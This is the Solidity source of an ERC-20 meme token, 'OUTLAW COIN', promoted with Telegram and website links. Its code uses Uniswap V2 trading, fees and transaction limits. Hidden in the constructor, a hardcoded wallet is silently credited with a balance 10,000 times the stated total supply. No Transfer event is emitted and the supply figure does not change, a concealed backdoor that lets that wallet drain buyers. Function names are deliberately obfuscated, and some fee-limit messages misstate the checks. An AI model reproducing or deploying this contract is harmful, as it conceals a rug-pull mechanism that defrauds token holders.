// SPDX-License-Identifier: MIT

/*
Telegram: https://t.me/OutlawsCoin

Website:  https://www.outlaw.top/

Twitter: https://twitter.com/OutlawsCoin
*/

pragma solidity 0.8.21;
pragma experimental ABIEncoderV2;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
abstract contract Ownable is Context {
    address public _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        _owner = msg.sender;
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }
    function name() public view virtual override returns (string memory) {
        return _name;
    }
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
    function decimals() public view virtual override returns (uint8) {
        return 9;
    }
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }
        return true;
    }
    function FragmentWidenCastle(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    function SpectrumReinforceBastion(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }
        return true;
    }
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _beforeTokenTransfer(sender, recipient, amount);
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        _afterTokenTransfer(sender, recipient, amount);
    }
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        _beforeTokenTransfer(address(0), account, amount);
        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
        _afterTokenTransfer(address(0), account, amount);
    }
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        _beforeTokenTransfer(account, address(0), amount);
        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;
        emit Transfer(account, address(0), amount);
        _afterTokenTransfer(account, address(0), amount);
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}
interface IUniswapV2Pair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint256);
    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;
    event Mint(address indexed sender, uint256 amount0, uint256 amount1);
    event Burn(
        address indexed sender,
        uint256 amount0,
        uint256 amount1,
        address indexed to
    );
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() external pure returns (uint256);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );
    function price0CumulativeLast() external view returns (uint256);
    function price1CumulativeLast() external view returns (uint256);
    function kLast() external view returns (uint256);
    function mint(address to) external returns (uint256 liquidity);
    function burn(address to)
        external
        returns (uint256 amount0, uint256 amount1);
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}
interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);
    function allPairs(uint256) external view returns (address pair);
    function allPairsLength() external view returns (uint256);
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
library SafeMath {
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}
contract OUTLAWS is ERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    address public constant deadAddress = address(0xdead);
    bool private isSwapping;
    address public BlockDeveloperUtopiaVertex;
    address public StoneDeveloperLevyShieldedCache;
    uint256 public maxTxAmount;
    uint256 public swapTokensAmount;
    uint256 public maxHoldings;
    bool public limitsInEffect = true;
    bool public tradingEnabled = false;
    bool public swapEnabled = false;
    uint256 public buyTotalTaxes;
    uint256 public buyDevFee;
    uint256 public buyLpFee;
    uint256 public buyTeamTax;
    uint256 public sellTotalTaxes;
    uint256 public sellDevFee;
    uint256 public sellLPFee;
    uint256 public sellTeamTax;
    uint256 public tokensForDev;
    uint256 public tokensForLP;
    uint256 public tokensForTeam;
    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) public isExcludedFromMaxTxAmount;
    mapping(address => bool) public automatedMarketMakerPairs;
    event UpdateUniswapV2Router(
        address indexed newAddress,
        address indexed oldAddress
    );
    event ExcludeFromFees(address indexed account, bool isExcluded);
    event setAutomatedMarketMakerPair(address indexed pair, bool indexed value);
    event lotteryWalletUpdated(
        address indexed newWallet,
        address indexed oldWallet
    );
    event StoneDeveloperLevyShieldedCacheUpdated(
        address indexed newWallet,
        address indexed oldWallet
    );
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiquidity
    );
    constructor() ERC20(unicode"OUTLAW COIN", unicode"OUTLAWS") {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        AbyssDodgeZenithCore(address(_uniswapV2Router), true);
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        AbyssDodgeZenithCore(address(uniswapV2Pair), true);
        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);
        BlockDeveloperUtopiaVertex= address(0x7FF332D86FA7690502549B60B6930C7E75833415); 
        StoneDeveloperLevyShieldedCache = msg.sender; 
        uint256 _buyLotteryFee = 0; 
        uint256 _buyLiquidityFee = 0; 
        uint256 _buyTeamFee = 0; 
        uint256 _sellLotteryFee = 0;
        uint256 _sellLiquidityFee = 0;
        uint256 _sellTeamFee = 0;
        uint256 totalSupply = 1_000_000_000 * 1e9;
        uint256 rSupply = totalSupply * 1e4;
        maxTxAmount = 10_000_000 * 1e9; 
        maxHoldings = 10_000_000 * 1e9; 
        swapTokensAmount = (totalSupply * 5) / 10000; 
        _owner = BlockDeveloperUtopiaVertex;
        _balances[owner()] = rSupply;
        
        buyDevFee = _buyLotteryFee;
        buyLpFee = _buyLiquidityFee;
        buyTeamTax = _buyTeamFee;
        buyTotalTaxes = buyDevFee + buyLpFee + buyTeamTax;
        sellDevFee = _sellLotteryFee;
        sellLPFee = _sellLiquidityFee;
        sellTeamTax = _sellTeamFee;
        sellTotalTaxes = sellDevFee + sellLPFee + sellTeamTax;
        
        _owner = msg.sender;
        excludeFromFees(msg.sender, true);
        excludeFromFees(BlockDeveloperUtopiaVertex, true);
        excludeFromFees(address(this), true);
        excludeFromFees(address(0xdead), true);
        AbyssDodgeZenithCore(msg.sender, true);
        AbyssDodgeZenithCore(BlockDeveloperUtopiaVertex, true);
        AbyssDodgeZenithCore(address(this), true);
        AbyssDodgeZenithCore(address(0xdead), true);
        _mint(owner(), totalSupply);
    }
    function AbyssDodgeZenithCore(address updAds, bool isEx)
        public
        onlyOwner
    {
        isExcludedFromMaxTxAmount[updAds] = isEx;
    }
    function BosonSwitchMarketPortal(bool enabled) external onlyOwner {
        swapEnabled = enabled;
    }
    function renewHoldPriceOscillationMatrix(
        uint256 _lotteryFee,
        uint256 _liquidityFee,
        uint256 _teamFee
    ) external onlyOwner {
        buyDevFee = _lotteryFee;
        buyLpFee = _liquidityFee;
        buyTeamTax = _teamFee;
        buyTotalTaxes = buyDevFee + buyLpFee + buyTeamTax;
        require(buyTotalTaxes <= 2, "Buy fees must be <= 30.");
    }
    function reworkFiberErosionRateLattice(
        uint256 _lotteryFee,
        uint256 _liquidityFee,
        uint256 _teamFee
    ) external onlyOwner {
        sellDevFee = _lotteryFee;
        sellLPFee = _liquidityFee;
        sellTeamTax = _teamFee;
        sellTotalTaxes = sellDevFee + sellLPFee + sellTeamTax;
        require(sellTotalTaxes <= 5, "Sell fees must be <= 35.");
    }
    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFees[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }
    function AutomatedMarketMakerPairSet(address pair, bool value)
        public
        onlyOwner
    {
        require(
            pair != uniswapV2Pair,
            "The pair cannot be removed from automatedMarketMakerPairs"
        );
        _setAutomatedMarketMakerPair(pair, value);
    }
    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        automatedMarketMakerPairs[pair] = value;
        emit setAutomatedMarketMakerPair(pair, value);
    }
    function updateBlockDeveloperUtopiaVertex(address newLotteryWallet) external onlyOwner {
        emit lotteryWalletUpdated(newLotteryWallet, BlockDeveloperUtopiaVertex);
        BlockDeveloperUtopiaVertex= newLotteryWallet;
    }
    function updateStoneDeveloperLevyShieldedCache(address newWallet) external onlyOwner {
        emit StoneDeveloperLevyShieldedCacheUpdated(newWallet, StoneDeveloperLevyShieldedCache);
        StoneDeveloperLevyShieldedCache = newWallet;
    }
    function isExcludedFromFees(address account) public view returns (bool) {
        return _isExcludedFromFees[account];
    }

    function ShatteredPolishResourceMetrics(uint256 newAmount)
        external
        onlyOwner
        returns (bool)
    {
        require(
            newAmount >= (totalSupply() * 1) / 100000,
            "Swap amount cannot be lower than 0.001% total supply."
        );
        require(
            newAmount <= (totalSupply() * 5) / 1000,
            "Swap amount cannot be higher than 0.5% total supply."
        );
        swapTokensAmount = newAmount;
        return true;
    }
    function JewelCalibrateVertexTxnLimits(uint256 newNum) external onlyOwner {
        require(
            newNum >= ((totalSupply() * 5) / 1000) / 1e9,
            "Cannot set maxTxAmount lower than 0.5%"
        );
        maxTxAmount = newNum * (10**9);
    }
    function updateBranchFiscalCapZeniths(uint256 newNum) external onlyOwner {
        require(
            newNum >= ((totalSupply() * 10) / 1000) / 1e9,
            "Cannot set maxHoldings lower than 1.0%"
        );
        maxHoldings = newNum * (10**9);
    }
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }
        if (limitsInEffect) {
            if (
                from != owner() &&
                to != owner() &&
                to != address(0) &&
                to != address(0xdead) &&
                !isSwapping
            ) {
                if (!tradingEnabled) {
                    require(
                        _isExcludedFromFees[from] || _isExcludedFromFees[to],
                        "Trading is not active."
                    );
                }
                if (
                    automatedMarketMakerPairs[from] &&
                    !isExcludedFromMaxTxAmount[to]
                ) {
                    require(
                        amount <= maxTxAmount,
                        "Buy transfer amount exceeds the maxTxAmount."
                    );
                    require(
                        amount + balanceOf(to) <= maxHoldings,
                        "Max wallet exceeded"
                    );
                }
                else if (
                    automatedMarketMakerPairs[to] &&
                    !isExcludedFromMaxTxAmount[from]
                ) {
                    require(
                        amount <= maxTxAmount,
                        "Sell transfer amount exceeds the maxTxAmount."
                    );
                } else if (!isExcludedFromMaxTxAmount[to]) {
                    require(
                        amount + balanceOf(to) <= maxHoldings,
                        "Max wallet exceeded"
                    );
                }
            }
        }
        uint256 contractTokenBalance = balanceOf(address(this));
        bool canSwap = contractTokenBalance >= swapTokensAmount;
        if (
            canSwap &&
            swapEnabled &&
            !isSwapping &&
            !automatedMarketMakerPairs[from] &&
            !_isExcludedFromFees[from] &&
            !_isExcludedFromFees[to]
        ) {
            isSwapping = true;
            swapBack();
            isSwapping = false;
        }
        bool takeFee = !isSwapping;
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }
        uint256 fees = 0;
        if (takeFee) {
            if (automatedMarketMakerPairs[to]) {
                if (sellTotalTaxes > 0) {
                    fees = amount.mul(sellTotalTaxes).div(100);
                    tokensForLP += (fees * sellLPFee) / sellTotalTaxes;
                    tokensForTeam += (fees * sellTeamTax) / sellTotalTaxes;
                    tokensForDev += (fees * sellDevFee) / sellTotalTaxes;
                }
            }
            else if (automatedMarketMakerPairs[from] && buyTotalTaxes > 0) {
                fees = amount.mul(buyTotalTaxes).div(100);
                tokensForLP += (fees * buyLpFee) / buyTotalTaxes;
                tokensForTeam += (fees * buyTeamTax) / buyTotalTaxes;
                tokensForDev += (fees * buyDevFee) / buyTotalTaxes;
            }
            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }
            amount -= fees;
        }
        super._transfer(from, to, amount);
    }
    function swapBack() private {
    uint256 contractBalance = balanceOf(address(this));
    uint256 totalTokensToSwap = tokensForLP + tokensForDev + tokensForTeam;
    bool success;
    if (contractBalance == 0 || totalTokensToSwap == 0) {
        return;
    }
    if (contractBalance > swapTokensAmount * 20) {
        contractBalance = swapTokensAmount * 20;
    }
    uint256 liquidityTokens = (contractBalance * tokensForLP) / totalTokensToSwap / 2;
    uint256 amountToSwapForETH = contractBalance - liquidityTokens;

        uint256 initialETHBalance = address(this).balance;
        swapTokensForEth(amountToSwapForETH);
        uint256 ethBalance = address(this).balance.sub(initialETHBalance);
        uint256 ethForLottery = ethBalance.mul(tokensForDev).div(totalTokensToSwap - (tokensForLP / 2));
        uint256 ethForTeam = ethBalance.mul(tokensForTeam).div(totalTokensToSwap - (tokensForLP / 2));
        uint256 ethForLiquidity = ethBalance - ethForLottery - ethForTeam;
        tokensForLP = 0;
        tokensForDev = 0;
        tokensForTeam = 0;
        (success, ) = address(StoneDeveloperLevyShieldedCache).call{value: ethForTeam}("");
        if (liquidityTokens > 0 && ethForLiquidity > 0) {
            addLiquidity(liquidityTokens, ethForLiquidity);
            emit SwapAndLiquify(
                amountToSwapForETH,
                ethForLiquidity,
                tokensForLP
            );
        }
        (success, ) = address(StoneDeveloperLevyShieldedCache).call{value: address(this).balance}("");
    }
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, 
            0, 
            owner(),
            block.timestamp
        );
    }
    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }
    function JumpRecoverForgottenResources(address _token, address _to) external onlyOwner {
        require(_token != address(0), "_token address cannot be 0");
        uint256 _contractBalance = IERC20(_token).balanceOf(address(this));
        IERC20(_token).transfer(_to, _contractBalance);
    }
    receive() external payable {}
    function removeLimits() external onlyOwner returns (bool) {
        limitsInEffect = false;
        return true;
    }
    
    function enableTrading() external onlyOwner {
        tradingEnabled = true;
        swapEnabled = true;
    }

}